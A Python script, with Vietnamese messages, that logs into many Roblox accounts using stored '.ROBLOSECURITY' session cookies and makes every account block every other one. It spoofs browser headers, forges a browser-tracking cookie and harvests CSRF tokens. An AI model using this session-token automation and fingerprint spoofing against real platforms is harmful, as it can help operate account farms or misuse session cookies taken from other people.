import time
import random
import datetime
import requests
from dataclasses import dataclass
from typing import List, Optional, Dict, Tuple, Any, Deque
from collections import deque

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.align import Align
from rich.text import Text
from rich import box
from rich.panel import Panel


AUTH_USER = "https://users.roblox.com/v1/users/authenticated"
BLOCK_API = "https://apis.roblox.com/user-blocking-api/v1/users/{targetUserId}/block-user"
CSRF_PRIMER = "https://auth.roblox.com/v2/logout"  

DEFAULT_DELAY = 0.25
MAX_RETRIES = 3

console = Console()


@dataclass
class Account:
    idx: int
    user_id: int
    session: requests.Session


def load_cookies(path: str = "cookies.txt") -> List[str]:
    out = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            out.append(line)
    return out


def make_session(cookie: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,vi;q=0.8",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/",
        "X-Requested-With": "XMLHttpRequest",
    })
    s.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com", path="/")
    return s


def prime_request_context(session: requests.Session) -> None:
    try:
        session.get("https://www.roblox.com/", timeout=10, allow_redirects=True)
    except Exception:
        pass

    v = session.cookies.get("RBXEventTrackerV2")
    if v and "browserid=" in v:
        return

    now = datetime.datetime.now(datetime.timezone.utc).strftime("%m/%d/%Y %H:%M:%S")
    browserid = random.randrange(10**15, 10**16)
    cookie_value = f"CreateDate={now}&rbxid=&browserid={browserid}"
    session.cookies.set("RBXEventTrackerV2", cookie_value, domain=".roblox.com", path="/")


def get_authenticated_user_id(session: requests.Session) -> Optional[int]:
    try:
        r = session.get(AUTH_USER, timeout=20)
        if r.status_code != 200:
            return None
        j = r.json()
        uid = j.get("id")
        if isinstance(uid, int):
            return uid
        if isinstance(uid, str) and uid.isdigit():
            return int(uid)
        return None
    except Exception:
        return None


def prime_csrf(session: requests.Session) -> Optional[str]:
    try:
        r = session.post(
            CSRF_PRIMER,
            headers={"x-csrf-token": "0"},
            timeout=15,
            allow_redirects=False
        )
        return r.headers.get("x-csrf-token")
    except Exception:
        return None


def _parse_json_or_text(resp: requests.Response) -> Any:
    try:
        return resp.json() if resp.text else {}
    except Exception:
        return resp.text


def block_user(session: requests.Session, csrf: Optional[str], target_uid: int) -> Tuple[bool, Optional[str], int, Any]:
    url = BLOCK_API.format(targetUserId=int(target_uid))
    headers = {}
    if csrf:
        headers["x-csrf-token"] = csrf

    try:
        r = session.post(url, headers=headers, json={}, timeout=20, allow_redirects=False)
    except Exception as e:
        return False, csrf, 0, str(e)
    if r.status_code == 403 and r.headers.get("x-csrf-token"):
        csrf = r.headers.get("x-csrf-token")
        headers["x-csrf-token"] = csrf
        try:
            r = session.post(url, headers=headers, json={}, timeout=20, allow_redirects=False)
        except Exception as e:
            return False, csrf, 0, str(e)

    chal = r.headers.get("rblx-challenge-id") or r.headers.get("rbx-challenge-id")
    if chal:
        return False, csrf, r.status_code, {"error": "challenge", "challenge_id": chal}

    data = _parse_json_or_text(r)

    ok = (r.status_code in (200, 204))
    if isinstance(data, dict) and data.get("errors"):
        ok = False

    return ok, csrf, r.status_code, data


def make_layout() -> Layout:
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=1),
        Layout(name="progress", size=3),
        Layout(name="body", ratio=1),
    )
    layout["body"].update(Panel.fit("...", title="Result", border_style="bright_blue"))
    return layout


def make_summary_table(ok: int, fail: int, retry_exhausted: int, ops: int, accounts: int, targets: int, proxies_used: int = 0) -> Table:
    t = Table(title="SUMMARY", show_header=True, header_style="bold")
    t.add_column("Metric", justify="left")
    t.add_column("Count", justify="right")
    t.add_row("[green]OK[/green]", str(ok))
    t.add_row("[red]FAIL[/red]", str(fail))
    t.add_row("[yellow]RETRY EXHAUSTED[/yellow]", str(retry_exhausted))
    t.add_row("", "")
    t.add_row("Operations", str(ops))
    t.add_row("Accounts", str(accounts))
    t.add_row("Targets", str(targets))
    t.add_row("Proxies used", str(proxies_used))
    return t


def make_recent_table(recent: Deque[Tuple[str, str, str]]) -> Table:
    t = Table(title="Result", show_header=True, header_style="bold")
    t.add_column("Status", justify="center")
    t.add_column("Blocker", justify="right")
    t.add_column("Target", justify="right")

    for status, a, b in list(recent):
        if status == "OK":
            t.add_row("[green]OK[/green]", a, b)
        else:
            t.add_row("[red]FAIL[/red]", a, b)
    if not recent:
        t.add_row("…", "…", "…")
    return t


def safe_reason(data: Any) -> str:
    if isinstance(data, dict):
        reason = data.get("message") or data.get("error") or ""
        if not reason and data.get("errors"):
            reason = str(data.get("errors"))
    else:
        reason = str(data)
    reason = (reason or "").strip()
    if len(reason) > 80:
        reason = reason[:80] + "..."
    return reason

def make_summary_panel(ok: int, fail: int, retry_exhausted: int,
                       ops: int, accounts: int, targets: int,
                       proxies_used: int = 0) -> Panel:
    t = Table(
        show_header=True,
        header_style="bold",
        box=box.SQUARE,
        expand=False,
        pad_edge=True,
    )
    t.add_column("Metric", justify="left", no_wrap=True)
    t.add_column("Count", justify="right")

    t.add_row("[green]OK[/green]", str(ok))
    t.add_row("[red]FAIL[/red]", str(fail))
    t.add_row("[yellow]RETRY EXHAUSTED[/yellow]", str(retry_exhausted))
    t.add_row("[dim]-[/dim]", "[dim]-[/dim]")
    t.add_row("[cyan]Operations[/cyan]", str(ops))
    t.add_row("[cyan]Accounts[/cyan]", str(accounts))
    t.add_row("[cyan]Targets[/cyan]", str(targets))
    t.add_row("[cyan]Proxies used[/cyan]", str(proxies_used))

    return Panel(
        t,
        title="[bold]SUMMARY[/bold]",
        border_style="bright_white",
    )

def main():
    console.clear()
    cookies = load_cookies("cookies.txt")
    total_cookie = len(cookies)
    if not cookies:
        console.print("[red]Không có cookie trong cookies.txt[/red]")
        return

    valid: List[Account] = []
    invalid_rows: List[List[str]] = []

    for i, ck in enumerate(cookies, start=1):
        s = make_session(ck)
        prime_request_context(s)
        uid = get_authenticated_user_id(s)
        if not uid:
            invalid_rows.append([str(i), "INVALID_COOKIE_OR_NOT_AUTH"])
            continue
        csrf = prime_csrf(s)
        if csrf:
            s.headers["x-csrf-token"] = csrf
        valid.append(Account(idx=i, user_id=uid, session=s))

    if len(valid) < 2:
        console.print("[red]Cần ít nhất 2 cookie hợp lệ để block chéo.[/red]")
        if invalid_rows:
            t = Table(title="Cookie lỗi")
            t.add_column("Idx"); t.add_column("Lý do")
            for r in invalid_rows:
                t.add_row(*r)
            console.print(t)
        return

    pairs: List[Tuple[int, int]] = []
    for ai, a in enumerate(valid):
        for b in valid:
            if a.user_id == b.user_id:
                continue
            pairs.append((ai, b.user_id))

    targets = len(valid)
    ops_total = len(pairs)

    ok_count = 0
    fail_count = 0
    retry_exhausted = 0

    successes: List[Tuple[int, int, int]] = []       
    failures: List[Tuple[int, int, int, str]] = []   

    csrf_by_ai: Dict[int, Optional[str]] = {i: (valid[i].session.headers.get("x-csrf-token") or None) for i in range(len(valid))}
    recent: Deque[Tuple[str, str, str]] = deque(maxlen=10)

    layout = make_layout()

    progress = Progress(
        TextColumn("[bold]Blocking[/bold]"),
        TextColumn("S:{task.fields[ok]} F:{task.fields[fail]}"),
        BarColumn(),
        TextColumn("[magenta]{task.percentage:>3.0f}%[/magenta]"),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=console,
        transient=False,
    )
    task_id = progress.add_task("", total=ops_total, ok=0, fail=0)

    with Live(layout, console=console, refresh_per_second=12, screen=True):
        layout["progress"].update(Align.left(progress))

        for n, (ai, target_uid) in enumerate(pairs, start=1):
            acc = valid[ai]
            blocker_uid = acc.user_id
            sess = acc.session

            csrf = csrf_by_ai.get(ai)

            attempt = 0
            last_ok = False
            last_status = 0
            last_data: Any = ""
            while attempt <= MAX_RETRIES:
                attempt += 1
                ok, csrf, status, data = block_user(sess, csrf, target_uid)
                csrf_by_ai[ai] = csrf
                last_ok, last_status, last_data = ok, status, data

                if ok:
                    break
                if status in (429, 500, 502, 503, 504) or status == 0:
                    if attempt <= MAX_RETRIES:
                        time.sleep(0.6)
                        continue
                break

            if last_ok:
                ok_count += 1
                successes.append((blocker_uid, target_uid, last_status))
                recent.appendleft(("OK", str(blocker_uid), str(target_uid)))
            else:
                fail_count += 1
                if (last_status in (429, 500, 502, 503, 504, 0)) and attempt > MAX_RETRIES:
                    retry_exhausted += 1
                failures.append((blocker_uid, target_uid, last_status, safe_reason(last_data)))
                recent.appendleft(("FAIL", str(blocker_uid), str(target_uid)))

            progress.update(task_id, advance=1, ok=ok_count, fail=fail_count)

            header_left = Text(f"Accounts usable: {len(valid)}/{total_cookie}; Targets: {targets}", style="cyan")
            layout["header"].update(header_left)

            body_layout = Layout()
            body_layout.split_row(
                Layout(name="summary", size=38),
                Layout(name="recent", ratio=1),
            )
            body_layout["summary"].update(
                make_summary_panel(ok_count, fail_count, retry_exhausted, ops_total, len(valid), targets, 0)
            )
            body_layout["recent"].update(make_recent_table(recent))

            layout["body"].update(Panel(body_layout, title="Result", border_style="bright_blue"))

            time.sleep(DEFAULT_DELAY)

    console.clear()
    console.print(make_summary_panel(ok_count, fail_count, retry_exhausted, ops_total, len(valid), targets, 0))
    console.print()



if __name__ == "__main__":
    main()
    input("\nNhấn Enter để thoát...")
